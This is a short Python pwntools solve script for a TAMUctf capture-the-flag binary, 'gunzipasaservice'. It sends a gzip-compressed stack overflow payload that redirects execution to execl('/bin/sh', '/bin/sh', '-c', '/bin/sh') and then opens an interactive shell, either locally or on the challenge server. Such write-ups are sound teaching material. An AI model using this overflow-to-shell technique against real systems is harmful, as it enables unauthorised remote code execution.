#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py

./solve.py REMOTE HOST=challenges.tamuctf.com PORT=4709
"""

import gzip

from pwn import *

PROG_PATH = './gunzipasaservice'
EIP_OFFSET = 1048

EXECL_ADDR = 0x8049298
TAC_C_ADDR = 0x804a008
BIN_SH_ADDR = 0x804a00e


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win(io):
    payload = b'A' * EIP_OFFSET
    payload += p32(EXECL_ADDR)
    payload += p32(BIN_SH_ADDR)  # execl file
    payload += p32(BIN_SH_ADDR)  # execl program arg
    payload += p32(TAC_C_ADDR)   # "
    payload += p32(BIN_SH_ADDR)  # "
    payload += p32(0x0)          # null-terminate arg list

    gzipped_payload = gzip.compress(payload)
    io.send(gzipped_payload)
    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)
